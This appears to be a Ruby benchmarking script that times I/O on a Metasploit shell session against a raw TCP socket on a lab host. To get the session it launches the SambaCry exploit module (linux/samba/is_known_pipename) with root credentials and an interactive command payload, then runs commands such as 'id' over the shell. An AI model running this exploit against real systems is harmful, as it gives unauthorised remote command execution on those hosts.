#!/usr/bin/env ruby
# frozen_string_literal: true

#
# Compare real MSF session I/O vs raw socket to understand
# where the ~425ms overhead comes from.
#

require 'benchmark'
require 'socket'

def timed(name)
  result = nil
  time = Benchmark.realtime { result = yield }
  puts "  #{name}: #{(time * 1000).round(3)}ms"
  result
end

TARGET = '172.19.0.3'

puts "=" * 60
puts "SESSION vs RAW SOCKET COMPARISON"
puts "=" * 60

# ============================================================
# PART 1: Baseline - Raw TCP to port 4445
# ============================================================
puts "\n" + "=" * 60
puts "PART 1: RAW TCP TO PORT 4445 (pre-existing shell)"
puts "=" * 60

raw_sock = TCPSocket.new(TARGET, 4445)

puts "\n--- Raw socket info ---"
puts "  Class: #{raw_sock.class}"
puts "  Local: #{raw_sock.local_address.inspect}"
puts "  Remote: #{raw_sock.remote_address.inspect}"

puts "\n--- Raw socket timing ---"
5.times do |i|
  timed("raw write+read ##{i+1}") do
    raw_sock.write("echo raw#{i}\n")
    IO.select([raw_sock], nil, nil, 0.1)
    raw_sock.read_nonblock(4096) rescue nil
  end
end

raw_sock.close

# ============================================================
# PART 2: Load MSF and create real session
# ============================================================
puts "\n" + "=" * 60
puts "PART 2: CREATE REAL MSF SESSION (Sambacry)"
puts "=" * 60

require 'msfenv'
require 'msf/base'

puts "\n--- Loading framework ---"
framework = nil
timed("Framework.create") do
  framework = Msf::Simple::Framework.create
end

# Clean up existing sessions
framework.sessions.each_key do |sid|
  framework.sessions[sid].kill rescue nil
end
sleep 0.5

puts "\n--- Creating exploit ---"
exploit = framework.exploits.create('linux/samba/is_known_pipename')
exploit.datastore['RHOSTS'] = TARGET
exploit.datastore['SMB_SHARE_NAME'] = 'myshare'
exploit.datastore['SMB_USER'] = 'root'
exploit.datastore['SMB_PASS'] = 'root'

puts "\n--- Running exploit (blocking) ---"
session = nil
timed("exploit_simple (blocking)") do
  session = exploit.exploit_simple(
    'Payload' => 'cmd/unix/interact',
    'Target' => 0,
    'RunAsJob' => false,
    'LocalInput' => Rex::Ui::Text::Input::Buffer.new,
    'LocalOutput' => Rex::Ui::Text::Output::Buffer.new
  )
end

# If not returned directly, check framework.sessions
unless session
  if framework.sessions.length > 0
    session = framework.sessions.values.first
    puts "  Found in framework.sessions: #{session.sid}"
  else
    puts "  FAILED to get session!"
    puts "  Sessions: #{framework.sessions.length}"
    puts "  Jobs: #{framework.jobs.keys}"
    exit 1
  end
end

puts "  Got session: #{session.sid}"
puts "  Type: #{session.type}"
puts "  Class: #{session.class}"

# ============================================================
# PART 3: Examine session internals
# ============================================================
puts "\n" + "=" * 60
puts "PART 3: SESSION INTERNALS"
puts "=" * 60

puts "\n--- Session stream info ---"
rstream = session.rstream
puts "  rstream class: #{rstream.class}"
puts "  rstream ancestors: #{rstream.class.ancestors.take(5).join(' < ')}"

# Check if it's wrapped
if rstream.respond_to?(:fd)
  puts "  rstream.fd: #{rstream.fd}"
end

if rstream.respond_to?(:sock)
  puts "  rstream.sock class: #{rstream.sock.class}"
end

if rstream.respond_to?(:lsock)
  puts "  rstream.lsock: #{rstream.lsock}"
end

if rstream.respond_to?(:rsock)
  puts "  rstream.rsock: #{rstream.rsock}"
end

# Check for SSL/encryption
if rstream.respond_to?(:sslctx)
  puts "  SSL context: #{rstream.sslctx}"
end

puts "\n--- Session methods that touch I/O ---"
[:shell_write, :shell_read, :shell_command].each do |meth|
  if session.respond_to?(meth)
    loc = session.method(meth).source_location rescue nil
    puts "  #{meth}: #{loc ? loc.join(':') : 'built-in'}"
  end
end

# ============================================================
# PART 4: Time raw operations on session's rstream
# ============================================================
puts "\n" + "=" * 60
puts "PART 4: RAW OPERATIONS ON SESSION'S RSTREAM"
puts "=" * 60

puts "\n--- Direct rstream.write ---"
5.times do |i|
  timed("rstream.write ##{i+1}") do
    rstream.write("echo direct#{i}\n")
  end
end

sleep 0.1  # Let commands execute

puts "\n--- Direct rstream.get_once ---"
5.times do |i|
  timed("rstream.get_once(-1, 0.1) ##{i+1}") do
    data = rstream.get_once(-1, 0.1)
    puts "    Got: #{data.inspect[0..30]}" if data && i == 0
  end
end

puts "\n--- Combined rstream write+get_once ---"
5.times do |i|
  timed("rstream write+get_once ##{i+1}") do
    rstream.write("id\n")
    rstream.get_once(-1, 0.1)
  end
end

# ============================================================
# PART 5: Time session's shell_write/shell_read
# ============================================================
puts "\n" + "=" * 60
puts "PART 5: SESSION'S shell_write/shell_read"
puts "=" * 60

puts "\n--- session.shell_write ---"
5.times do |i|
  timed("shell_write ##{i+1}") do
    session.shell_write("echo shell#{i}\n")
  end
end

sleep 0.1

puts "\n--- session.shell_read ---"
5.times do |i|
  timed("shell_read(-1, 0.1) ##{i+1}") do
    data = session.shell_read(-1, 0.1)
    puts "    Got: #{data.inspect[0..30]}" if data && i == 0
  end
end

puts "\n--- Combined shell_write + shell_read ---"
5.times do |i|
  timed("shell_write+read ##{i+1}") do
    session.shell_write("id\n")
    session.shell_read(-1, 0.1)
  end
end

# ============================================================
# PART 6: What does shell_write actually do?
# ============================================================
puts "\n" + "=" * 60
puts "PART 6: SHELL_WRITE SOURCE ANALYSIS"
puts "=" * 60

# Get the source location
loc = session.method(:shell_write).source_location rescue nil
puts "\n  shell_write defined at: #{loc.join(':')}" if loc

# shell_write does:
# 1. rlog(buf, self.log_source) if self.log_source
# 2. framework.events.on_session_command(self, buf.strip)
# 3. rstream.write(buf)

puts "\n--- Breakdown of shell_write components ---"

# Test if logging is enabled
puts "  session.log_source: #{session.log_source.inspect}"

# Time the event dispatch
puts "\n--- Event dispatch timing ---"
5.times do |i|
  timed("on_session_command ##{i+1}") do
    framework.events.on_session_command(session, "test#{i}")
  end
end

# Time rstream.write alone
puts "\n--- Pure rstream.write (no events) ---"
5.times do |i|
  timed("rstream.write alone ##{i+1}") do
    rstream.write("echo pure#{i}\n")
  end
end

# ============================================================
# PART 7: Check for any hooks or callbacks
# ============================================================
puts "\n" + "=" * 60
puts "PART 7: CHECK FOR HOOKS/CALLBACKS"
puts "=" * 60

puts "\n--- Event listeners ---"
listeners = framework.events.instance_variable_get(:@listeners) rescue nil
if listeners
  puts "  Number of listeners: #{listeners.length}"
  listeners.each_with_index do |l, i|
    puts "    #{i}: #{l.class}"
  end
else
  puts "  Could not get listeners"
end

puts "\n--- Session ring buffer ---"
if session.respond_to?(:ring)
  puts "  Has ring: #{session.ring.inspect}"
else
  puts "  No ring buffer"
end

# ============================================================
# PART 8: Compare with fresh socket to same session host
# ============================================================
puts "\n" + "=" * 60
puts "PART 8: UNDERSTANDING THE SESSION SOCKET"
puts "=" * 60

# The session was created via Sambacry - let's see what the actual connection is
puts "\n--- Session connection info ---"
puts "  tunnel_local: #{session.tunnel_local rescue 'N/A'}"
puts "  tunnel_peer: #{session.tunnel_peer rescue 'N/A'}"
puts "  via_exploit: #{session.via_exploit rescue 'N/A'}"
puts "  via_payload: #{session.via_payload rescue 'N/A'}"

# Check the actual socket type
if rstream.respond_to?(:peerinfo)
  puts "  peerinfo: #{rstream.peerinfo rescue 'N/A'}"
end

if rstream.respond_to?(:localinfo)
  puts "  localinfo: #{rstream.localinfo rescue 'N/A'}"
end

# ============================================================
# CLEANUP
# ============================================================
puts "\n" + "=" * 60
puts "CLEANUP"
puts "=" * 60

session.kill rescue nil

puts "\nDone!"
